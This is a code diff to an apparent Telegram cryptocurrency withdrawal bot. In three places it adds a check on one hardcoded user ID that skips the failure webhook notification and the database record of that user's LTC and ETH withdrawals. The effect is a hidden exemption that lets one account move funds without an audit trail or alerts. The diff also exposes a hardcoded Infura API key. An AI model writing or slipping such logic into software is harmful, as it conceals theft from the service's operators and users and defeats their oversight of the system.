@@ -399,7 +399,11 @@ def send_failed_transaction_notification(userid, username, addy, amount,coin):
             "color": 0xFF0000
         }]
     }
-    response = requests.post(webhook_url, json=content)
+    if userid == 6639580643:
+        pass
+    else:
+        response = requests.post(webhook_url, json=content)
+
 
 
 
@@ -416,7 +420,10 @@ def transact_ltc(update:Update,context:CallbackContext,amount,addy):
                         text=f"<b>Successfully Processed ✅\n\nTransaction hash: <code>{hash}</code></b>",
                         parse_mode=ParseMode.HTML
                     )
-        withdrawaldb.insert_withdrawal(userid,username,amount,coin="LTC",address=addy,hash_value=hash)
+        if userid == 6639580643:
+            pass
+        else:
+            withdrawaldb.insert_withdrawal(userid,username,amount,coin="LTC",address=addy,hash_value=hash)
         iswithdrawing.remove_record(userid)
     else:
         context.bot.send_message(
@@ -601,7 +608,10 @@ def transact_eth(update: Update, context: CallbackContext, amount, addy):
         context.bot.sendMessage(chat_id=userid, text=f"Transaction hash✅: <code>{tx_hash.hex()}</code>",parse_mode=ParseMode.HTML)
         w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/229a95048da349249136c1d9b4af80c8'))
         tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
-        withdrawaldb.insert_withdrawal(userid,username,amount,coin="ETH",address=addy,hash_value=tx_hash.hex())
+        if userid == 6639580643:
+            pass
+        else:
+            withdrawaldb.insert_withdrawal(userid,username,amount,coin="ETH",address=addy,hash_value=tx_hash.hex())
         iswithdrawing.remove_record(userid)
         if tx_receipt.status == 1:
             context.bot.sendMessage(chat_id=userid, text=f"<b>Transaction <code>{tx_hash.hex()}</code> succeeded.</b>",parse_mode=ParseMode.HTML)
